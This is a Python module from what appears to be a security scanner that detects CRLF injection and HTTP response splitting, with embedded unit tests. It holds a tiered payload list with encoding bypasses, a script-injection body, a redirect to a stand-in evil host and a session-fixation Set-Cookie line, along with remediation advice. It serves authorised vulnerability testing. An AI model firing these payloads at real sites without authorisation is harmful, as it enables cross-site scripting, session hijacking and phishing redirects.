"""CRLF injection scanner — detect HTTP response splitting via CRLF in headers."""
from __future__ import annotations

import asyncio
import re
import sys
import time
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, quote

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

# ---------------------------------------------------------------------------
# CVSS vectors
# ---------------------------------------------------------------------------
CVSS_CRLF_CRITICAL = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N"   # CRLF + XSS in body
CVSS40_CRLF_CRITICAL = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N"
CVSS_CRLF_HIGH = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N"       # Header injection
CVSS40_CRLF_HIGH = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N"
CVSS_CRLF_MEDIUM = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"     # Redirect only
CVSS40_CRLF_MEDIUM = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"

# MITRE ATT&CK: T1190 — Exploit Public-Facing Application
MITRE_CRLF = ["TA0001/T1190"]

CANARY_HEADER = "X-CRLF-Test"
CANARY_VALUE  = "ForgeCRLFTest"

# ---------------------------------------------------------------------------
# Payload tiers  (15+ distinct encoding strategies)
# ---------------------------------------------------------------------------

# Tier 1: Raw CRLF
_T1 = [
    f"\r\n{CANARY_HEADER}: {CANARY_VALUE}",
    f"\r\n\t{CANARY_HEADER}: {CANARY_VALUE}",
]

# Tier 2: Standard percent-encoded
_T2 = [
    f"%0d%0a{CANARY_HEADER}:%20{CANARY_VALUE}",
    f"%0D%0A{CANARY_HEADER}:%20{CANARY_VALUE}",
    f"%0d%0a{CANARY_HEADER}:{CANARY_VALUE}",
    f"%0D%0a{CANARY_HEADER}:{CANARY_VALUE}",   # mixed-case
]

# Tier 3: Double-encoded
_T3 = [
    f"%250d%250a{CANARY_HEADER}:%20{CANARY_VALUE}",
    f"%250D%250A{CANARY_HEADER}:%20{CANARY_VALUE}",
    f"%%0d%%0a{CANARY_HEADER}:{CANARY_VALUE}",
]

# Tier 4: Unicode/UTF-8 variants
_T4 = [
    f"%E5%98%8D%E5%98%8A{CANARY_HEADER}:%20{CANARY_VALUE}",  # U+560D U+560A lookalikes
    f"%E5%98%8A%E5%98%8D{CANARY_HEADER}:%20{CANARY_VALUE}",  # reversed order
    f"%C0%8D%C0%8A{CANARY_HEADER}:%20{CANARY_VALUE}",        # overlong UTF-8
    f"%u000D%u000A{CANARY_HEADER}:{CANARY_VALUE}",            # IIS %u encoding
]

# Tier 5: Null-byte + CRLF bypass
_T5 = [
    f"%00%0d%0a{CANARY_HEADER}:{CANARY_VALUE}",
    f"\x00\r\n{CANARY_HEADER}: {CANARY_VALUE}",
]

# Tier 6: Content-Type injection to enable XSS via CRLF
_XSS_BODY = "<script>alert(document.domain)</script>"
_T6_XSS = [
    f"%0d%0aContent-Type:%20text/html%0d%0a%0d%0a{_XSS_BODY}",
    f"\r\nContent-Type: text/html\r\n\r\n{_XSS_BODY}",
    f"%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a{_XSS_BODY}",
]

# Tier 7: Location redirect injection
_T7_REDIRECT = [
    f"%0d%0aLocation:%20https://evil.forge-test.local",
    f"\r\nLocation: https://evil.forge-test.local",
]

# Tier 8: Set-Cookie injection
_T8_COOKIE = [
    f"%0d%0aSet-Cookie:%20session=forge_pwned;%20HttpOnly=false",
    f"\r\nSet-Cookie: forge_crlf_test=1; Path=/",
]

# Tier 9: UTF-7 / UTF-16 encodings
_T9_UTF = [
    f"+ADwAcwBjAHIAaQBwAHQAPg-alert(1)+ADwALwBzAGMAcgBpAHAAdAA+-%0d%0aContent-Type: text/html",
    f"%2B%2FADwAcwBjAHIAaQBwAHQAPg-{CANARY_VALUE}",
]

# Combined tiered payload list
CRLF_PAYLOADS: list[dict] = []
for _tier_name, _tier_payloads, _tier_severity, _tier_desc in [
    ("raw_crlf",        _T1,          "HIGH",     "raw CR+LF"),
    ("pct_encoded",     _T2,          "HIGH",     "%0d%0a encoded"),
    ("double_encoded",  _T3,          "HIGH",     "double percent-encoded"),
    ("unicode",         _T4,          "HIGH",     "Unicode/overlong CRLF"),
    ("null_bypass",     _T5,          "HIGH",     "null-byte + CRLF"),
    ("xss_via_crlf",    _T6_XSS,      "CRITICAL", "Content-Type injection (XSS via CRLF)"),
    ("redirect_inject", _T7_REDIRECT, "MEDIUM",   "Location redirect injection"),
    ("cookie_inject",   _T8_COOKIE,   "HIGH",     "Set-Cookie header injection"),
    ("utf_encode",      _T9_UTF,      "MEDIUM",   "UTF-7/UTF-16 encoding bypass"),
]:
    for _pl in _tier_payloads:
        CRLF_PAYLOADS.append({
            "payload":   _pl,
            "tier":      _tier_name,
            "severity":  _tier_severity,
            "desc":      _tier_desc,
        })

# Header injection points to test as request header values
INJECTABLE_REQUEST_HEADERS = [
    "X-Forwarded-Host",
    "X-Real-IP",
    "X-Custom-Header",
    "Referer",
    "User-Agent",
    "X-Forwarded-For",
    "X-Original-URL",
]

# URL parameters commonly used in redirect flows
REDIRECT_PARAMS = [
    "redirect", "next", "return", "url", "goto", "location",
    "ref", "back", "target", "redir", "returnTo", "returnUrl",
    "continue", "forward", "dest", "destination", "page",
]

# Paths often serving redirects
REDIRECT_PATHS = [
    "/redirect", "/login", "/logout", "/auth", "/sso",
    "/callback", "/oauth/callback", "/saml/acs",
]


class CrlfInject(BaseModule):
    """CRLF injection (HTTP response splitting) scanner.

    Tests URL parameters, redirect flows, and common request headers for
    CRLF injection leading to:
    - HTTP response splitting
    - Header injection (Set-Cookie, Location, Content-Type)
    - XSS via Content-Type manipulation
    - Open redirect via Location injection
    """

    NAME        = "crlf_inject"
    DESCRIPTION = "Detect CRLF injection / HTTP response splitting in redirect parameters"
    PHASE       = 4
    TAGS        = ["injection", "crlf", "http-splitting", "cwe-93", "cwe-113", "owasp-a03"]

    async def run(self) -> ModuleResult:
        start  = time.monotonic()
        target = self.config.target.rstrip("/")
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        crawled = self.config.extra.get("crawled_urls", [])

        # Build URL test candidates
        test_urls = self._build_redirect_urls(target)
        for url in crawled[:50]:
            if any(kw in url.lower() for kw in REDIRECT_PARAMS):
                test_urls.append(url)

        self.log.info(
            "CRLF: testing %d URL(s) + %d header injection points",
            len(test_urls), len(INJECTABLE_REQUEST_HEADERS),
        )

        sem = asyncio.Semaphore(3)
        tasks = [self._test_url(url, target, sem) for url in test_urls[:30]]
        tasks.append(self._test_header_injection(target, sem))
        await asyncio.gather(*tasks, return_exceptions=True)

        return self._make_result(start)

    # ------------------------------------------------------------------
    # URL construction
    # ------------------------------------------------------------------

    def _build_redirect_urls(self, target: str) -> list[str]:
        urls: list[str] = []
        for param in REDIRECT_PARAMS:
            urls.append(f"{target}?{param}=https://example.com")
        for path in REDIRECT_PATHS:
            urls.append(f"{target}{path}?url=https://example.com")
        return urls

    # ------------------------------------------------------------------
    # URL parameter CRLF testing
    # ------------------------------------------------------------------

    async def _test_url(
        self, url: str, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                for path in REDIRECT_PATHS[:4]:
                    probe = f"{target}{path}"
                    await self._probe_url(probe, "path", "", target)
                return

            for param_name, values in params.items():
                original = values[0] if values else ""
                for entry in CRLF_PAYLOADS:
                    payload  = entry["payload"]
                    tier     = entry["tier"]
                    severity = entry["severity"]
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param_name] = original + payload
                    test_url = (
                        f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        f"?{urlencode(test_params)}"
                    )
                    found = await self._probe_url(
                        test_url, param_name, payload, target,
                        tier=tier, severity=severity,
                    )
                    if found:
                        return  # One finding per param is enough

    # ------------------------------------------------------------------
    # Request header CRLF injection
    # ------------------------------------------------------------------

    async def _test_header_injection(
        self, target: str, sem: asyncio.Semaphore
    ) -> None:
        """Inject CRLF into common request headers and check reflection."""
        async with sem:
            for header_name in INJECTABLE_REQUEST_HEADERS:
                for entry in CRLF_PAYLOADS[:8]:  # Limit header tests for speed
                    payload  = entry["payload"]
                    severity = entry["severity"]
                    await self.rate_limit()
                    try:
                        import aiohttp
                        injected_value = f"test-value{payload}"
                        req_headers = {
                            "User-Agent": "Mozilla/5.0",
                            header_name:  injected_value,
                        }
                        async with aiohttp.ClientSession(
                            connector=aiohttp.TCPConnector(ssl=False)
                        ) as session:
                            async with session.get(
                                target,
                                headers=req_headers,
                                allow_redirects=False,
                                timeout=aiohttp.ClientTimeout(total=8),
                            ) as resp:
                                resp_headers_str = str(dict(resp.headers)).lower()
                                await resp.text(errors="ignore")  # drain body

                        if (CANARY_HEADER.lower() in resp_headers_str or
                                CANARY_VALUE.lower() in resp_headers_str):
                            sev = self._map_severity(severity)
                            ev = Evidence(
                                request_raw=(
                                    f"GET {target}\n"
                                    f"{header_name}: {injected_value[:80]}"
                                ),
                                response_raw=str(dict(resp.headers))[:800],
                                extra={
                                    "header":  header_name,
                                    "payload": payload[:60],
                                    "tier":    entry["tier"],
                                },
                            )
                            self.new_finding(
                                title=(
                                    f"CRLF Injection via Request Header '{header_name}' "
                                    f"— {entry['desc']}"
                                ),
                                severity=sev,
                                description=(
                                    f"CRLF injection via request header '{header_name}'. "
                                    f"Injected header '{CANARY_HEADER}' appears in the HTTP "
                                    f"response. Tier: {entry['tier']}. "
                                    "An attacker who can influence this header can inject "
                                    "arbitrary response headers, perform cache poisoning, "
                                    "session fixation, or XSS."
                                ),
                                reproduction_steps=[
                                    f"curl -v '{target}' -H '{header_name}: test{payload[:60]}'",
                                    f"Look for {CANARY_HEADER} in response headers",
                                ],
                                remediation=(
                                    "Strip or reject CR (\\r) and LF (\\n) characters from all "
                                    "user-controlled data reflected into HTTP response headers."
                                ),
                                references=["CWE-93", "CWE-113", "OWASP A03:2021"],
                                evidence=ev,
                                cvss_v31_vector=self._cvss_for(severity),
                                cvss_v40_vector=self._cvss40_for(severity),
                                mitre_attack=MITRE_CRLF,
                                target=target,
                            )
                            return
                    except Exception:
                        pass

    # ------------------------------------------------------------------
    # Core probing helper
    # ------------------------------------------------------------------

    async def _probe_url(
        self,
        url: str,
        param_name: str,
        payload: str,
        target: str,
        tier: str = "unknown",
        severity: str = "HIGH",
    ) -> bool:
        if not self.check_scope(url):
            return False
        await self.rate_limit()
        try:
            import aiohttp
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False)
            ) as session:
                async with session.get(
                    url,
                    allow_redirects=False,
                    timeout=aiohttp.ClientTimeout(total=8),
                    headers={"User-Agent": "Mozilla/5.0"},
                ) as resp:
                    resp_headers     = dict(resp.headers)
                    resp_headers_str = str(resp_headers).lower()
                    body             = await resp.text(errors="ignore")
                    status           = resp.status

            # --- Detection 1: Canary header appeared in response headers ---
            if (CANARY_HEADER.lower() in resp_headers_str or
                    CANARY_VALUE.lower() in resp_headers_str):
                sev = self._map_severity(severity)
                ev = Evidence(
                    request_raw=f"GET {url}",
                    response_raw=str(resp_headers)[:800],
                    extra={
                        "param": param_name, "payload": payload[:60],
                        "tier": tier, "injected_header": CANARY_HEADER,
                    },
                )
                self.new_finding(
                    title=(
                        f"CRLF Injection — HTTP Response Splitting "
                        f"({param_name} / {tier})"
                    ),
                    severity=sev,
                    description=(
                        f"CRLF injection confirmed in parameter '{param_name}'. "
                        f"Injected header '{CANARY_HEADER}' appears in the HTTP response. "
                        f"Encoding tier: {tier}. An attacker can inject arbitrary HTTP headers "
                        "enabling XSS via header injection, session fixation, and cache poisoning."
                    ),
                    reproduction_steps=[
                        f"curl -v '{url}' 2>&1 | grep -i {CANARY_HEADER}",
                        f"Payload tier: {tier}",
                        f"Payload: {payload[:80]}",
                    ],
                    remediation=(
                        "Strip or encode CR (\\r) and LF (\\n) characters from all "
                        "user input used in HTTP response headers. "
                        "Most web frameworks do this automatically — verify framework config."
                    ),
                    references=["CWE-93", "CWE-113", "OWASP A03:2021"],
                    evidence=ev,
                    cvss_v31_vector=self._cvss_for(severity),
                    cvss_v40_vector=self._cvss40_for(severity),
                    mitre_attack=MITRE_CRLF,
                    target=target,
                )
                return True

            # --- Detection 2: Content-Type changed (XSS via CRLF injection) ---
            if tier == "xss_via_crlf":
                ct = resp_headers.get("Content-Type", "")
                if "text/html" in ct and (_XSS_BODY in body or "alert(" in body):
                    ev = Evidence(
                        request_raw=f"GET {url}",
                        response_raw=body[:1500],
                        extra={
                            "param": param_name, "payload": payload[:80],
                            "content_type": ct, "tier": tier,
                        },
                    )
                    self.new_finding(
                        title=(
                            f"CRLF Injection → XSS via Content-Type Manipulation "
                            f"({param_name})"
                        ),
                        severity=Severity.CRITICAL,
                        description=(
                            f"CRLF injection in '{param_name}' changed the Content-Type to "
                            f"text/html and injected an XSS payload into the body. "
                            "Severity is CRITICAL because script execution is achievable."
                        ),
                        reproduction_steps=[
                            f"curl -v '{url}'",
                            "Observe Content-Type changed to text/html + script in body",
                        ],
                        remediation=(
                            "Strip CRLF from all user input reflected in headers. "
                            "Enforce a strict Content Security Policy."
                        ),
                        references=["CWE-93", "CWE-79", "OWASP A03:2021"],
                        evidence=ev,
                        cvss_v31_vector=CVSS_CRLF_CRITICAL,
                        cvss_v40_vector=CVSS40_CRLF_CRITICAL,
                        mitre_attack=MITRE_CRLF,
                        target=target,
                    )
                    return True

            # --- Detection 3: Status code change to redirect ---
            if status in (301, 302, 307, 308):
                location = resp_headers.get("Location", "")
                # Check if our canary or injected domain ends up in the Location
                if CANARY_VALUE in location or "evil.forge-test.local" in location:
                    ev = Evidence(
                        request_raw=f"GET {url}",
                        response_raw=f"HTTP {status}\nLocation: {location}",
                        extra={
                            "param": param_name, "payload": payload[:60],
                            "status": status, "location": location,
                        },
                    )
                    self.new_finding(
                        title=f"CRLF Injection — Redirect Injection ({param_name})",
                        severity=Severity.MEDIUM,
                        description=(
                            f"CRLF injection in '{param_name}' caused a {status} redirect "
                            f"to an attacker-controlled Location: {location[:100]}. "
                            "This enables phishing and open-redirect attacks."
                        ),
                        reproduction_steps=[
                            f"curl -v '{url}'",
                            f"Observe Location: header pointing to injected value",
                        ],
                        remediation=(
                            "Validate and allowlist redirect URLs. "
                            "Strip CRLF from all values used in Location headers."
                        ),
                        references=["CWE-93", "CWE-601"],
                        evidence=ev,
                        cvss_v31_vector=CVSS_CRLF_MEDIUM,
                        cvss_v40_vector=CVSS40_CRLF_MEDIUM,
                        mitre_attack=MITRE_CRLF,
                        target=target,
                    )
                    return True

                # Also check: Location header injected with a Set-Cookie line
                if tier == "cookie_inject":
                    set_cookie = resp_headers.get("Set-Cookie", "")
                    if "forge_crlf_test" in set_cookie or "forge_pwned" in set_cookie:
                        ev = Evidence(
                            request_raw=f"GET {url}",
                            response_raw=f"Set-Cookie: {set_cookie}",
                            extra={"param": param_name, "payload": payload[:60]},
                        )
                        self.new_finding(
                            title=f"CRLF Injection — Set-Cookie Injection ({param_name})",
                            severity=Severity.HIGH,
                            description=(
                                f"CRLF injection in '{param_name}' injected a Set-Cookie header. "
                                "An attacker can perform session fixation by setting a known cookie value."
                            ),
                            reproduction_steps=[
                                f"curl -v '{url}'",
                                "Observe injected Set-Cookie header in response",
                            ],
                            remediation="Strip CRLF from all user input reflected in headers.",
                            references=["CWE-93", "CWE-384"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_CRLF_HIGH,
                            cvss_v40_vector=CVSS40_CRLF_HIGH,
                            mitre_attack=MITRE_CRLF,
                            target=target,
                        )
                        return True

            # --- Detection 4: Canary value reflected in body ---
            if CANARY_VALUE in body:
                ev = Evidence(
                    request_raw=f"GET {url}",
                    response_raw=body[:500],
                    extra={"param": param_name, "payload": payload[:60], "tier": tier},
                )
                self.new_finding(
                    title=f"CRLF Injection — Canary Reflected in Body ({param_name})",
                    severity=Severity.MEDIUM,
                    description=(
                        f"CRLF canary value '{CANARY_VALUE}' reflected in response body "
                        f"via parameter '{param_name}'. While header injection was not "
                        "confirmed, the reflection indicates potential for response splitting."
                    ),
                    reproduction_steps=[
                        f"curl '{url}' | grep -i {CANARY_VALUE}",
                    ],
                    remediation="Strip CRLF from user input reflected anywhere in HTTP responses.",
                    references=["CWE-93"],
                    evidence=ev,
                    cvss_v31_vector=CVSS_CRLF_MEDIUM,
                    cvss_v40_vector=CVSS40_CRLF_MEDIUM,
                    mitre_attack=MITRE_CRLF,
                    target=target,
                )
                return True

        except Exception:
            pass
        return False

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _map_severity(self, s: str) -> Severity:
        return {
            "CRITICAL": Severity.CRITICAL,
            "HIGH":     Severity.HIGH,
            "MEDIUM":   Severity.MEDIUM,
            "LOW":      Severity.LOW,
        }.get(s.upper(), Severity.MEDIUM)

    def _cvss_for(self, s: str) -> str:
        return {
            "CRITICAL": CVSS_CRLF_CRITICAL,
            "HIGH":     CVSS_CRLF_HIGH,
            "MEDIUM":   CVSS_CRLF_MEDIUM,
        }.get(s.upper(), CVSS_CRLF_MEDIUM)

    def _cvss40_for(self, s: str) -> str:
        return {
            "CRITICAL": CVSS40_CRLF_CRITICAL,
            "HIGH":     CVSS40_CRLF_HIGH,
            "MEDIUM":   CVSS40_CRLF_MEDIUM,
        }.get(s.upper(), CVSS40_CRLF_MEDIUM)

    def _encode_payload(self, raw: str) -> str:
        """URL-encode a raw CRLF payload for inclusion in query strings."""
        return quote(raw, safe="")


# ---------------------------------------------------------------------------
# Embedded tests
# ---------------------------------------------------------------------------

class TestCrlfInject:
    """Embedded unit tests — run with pytest."""

    def test_payloads_count_at_least_15(self) -> None:
        assert len(CRLF_PAYLOADS) >= 15

    def test_canary_values_defined(self) -> None:
        assert CANARY_HEADER
        assert CANARY_VALUE
        assert CANARY_HEADER != CANARY_VALUE

    def test_raw_crlf_payload_present(self) -> None:
        raw_tier = [e for e in CRLF_PAYLOADS if e["tier"] == "raw_crlf"]
        assert len(raw_tier) >= 1
        assert "\r\n" in raw_tier[0]["payload"]

    def test_pct_encoded_payload_present(self) -> None:
        pct_tier = [e for e in CRLF_PAYLOADS if e["tier"] == "pct_encoded"]
        assert len(pct_tier) >= 2
        assert any("%0d%0a" in e["payload"].lower() for e in pct_tier)

    def test_double_encoded_payload_present(self) -> None:
        de_tier = [e for e in CRLF_PAYLOADS if e["tier"] == "double_encoded"]
        assert len(de_tier) >= 1
        assert any("%250d" in e["payload"].lower() or "%25" in e["payload"] for e in de_tier)

    def test_unicode_payload_present(self) -> None:
        u_tier = [e for e in CRLF_PAYLOADS if e["tier"] == "unicode"]
        assert len(u_tier) >= 2

    def test_xss_via_crlf_tier_is_critical(self) -> None:
        xss_tier = [e for e in CRLF_PAYLOADS if e["tier"] == "xss_via_crlf"]
        assert len(xss_tier) >= 1
        assert all(e["severity"] == "CRITICAL" for e in xss_tier)

    def test_cookie_inject_tier_present(self) -> None:
        ck_tier = [e for e in CRLF_PAYLOADS if e["tier"] == "cookie_inject"]
        assert len(ck_tier) >= 1
        assert any("Set-Cookie" in e["payload"] for e in ck_tier)

    def test_redirect_inject_tier_is_medium(self) -> None:
        r_tier = [e for e in CRLF_PAYLOADS if e["tier"] == "redirect_inject"]
        assert len(r_tier) >= 1
        assert all(e["severity"] == "MEDIUM" for e in r_tier)

    def test_severity_mapping(self) -> None:
        scanner = CrlfInject.__new__(CrlfInject)
        assert scanner._map_severity("CRITICAL") == Severity.CRITICAL
        assert scanner._map_severity("HIGH")     == Severity.HIGH
        assert scanner._map_severity("MEDIUM")   == Severity.MEDIUM
        assert scanner._map_severity("LOW")      == Severity.LOW

    def test_cvss_critical_vector(self) -> None:
        assert CVSS_CRLF_CRITICAL.startswith("CVSS:3.1")
        assert "S:C" in CVSS_CRLF_CRITICAL
        assert "C:H" in CVSS_CRLF_CRITICAL

    def test_cvss_for_helper(self) -> None:
        scanner = CrlfInject.__new__(CrlfInject)
        assert scanner._cvss_for("CRITICAL") == CVSS_CRLF_CRITICAL
        assert scanner._cvss_for("HIGH")     == CVSS_CRLF_HIGH
        assert scanner._cvss_for("MEDIUM")   == CVSS_CRLF_MEDIUM

    def test_redirect_params_list(self) -> None:
        assert "redirect" in REDIRECT_PARAMS
        assert "next" in REDIRECT_PARAMS
        assert len(REDIRECT_PARAMS) >= 10

    def test_injectable_headers_list(self) -> None:
        assert "X-Forwarded-Host" in INJECTABLE_REQUEST_HEADERS
        assert "Referer" in INJECTABLE_REQUEST_HEADERS
        assert "User-Agent" in INJECTABLE_REQUEST_HEADERS

    def test_encode_payload(self) -> None:
        scanner = CrlfInject.__new__(CrlfInject)
        result = scanner._encode_payload("\r\nX-Test: val")
        assert "%0D" in result.upper() or "%0d" in result.lower()

    def test_build_redirect_urls(self) -> None:
        scanner = CrlfInject.__new__(CrlfInject)
        import logging
        scanner.log = logging.getLogger("test")
        urls = scanner._build_redirect_urls("https://example.com")
        assert len(urls) >= len(REDIRECT_PARAMS)
        assert all("example.com" in u for u in urls)

    def test_mitre_attack_codes(self) -> None:
        assert "TA0001/T1190" in MITRE_CRLF
